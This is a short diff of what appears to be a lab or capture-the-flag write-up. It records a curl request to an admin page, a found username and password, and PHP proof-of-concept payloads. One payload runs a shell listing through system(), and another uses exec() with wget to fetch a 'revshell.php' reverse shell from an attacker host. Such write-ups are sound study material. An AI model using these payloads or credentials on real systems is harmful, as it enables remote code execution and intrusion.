@@ -1,11 +1,11 @@
-**By: curl -v http://10.10.10.27/admin.php
-Account find:
-admin
-skoupidotenekes**
-**For POC:**
+**By: curl -v http://10.10.10.27/admin.php  
+Account find:  
+admin   
+skoupidotenekes**  
+**For POC:**   
 ```shell
 <?php system('ls -lah') ?>
-??
+Permission denied:
 <?php exec('wget http://10.10.14.11/revshell.php') ?>
 ```
 **Try but fail by VM setting:**
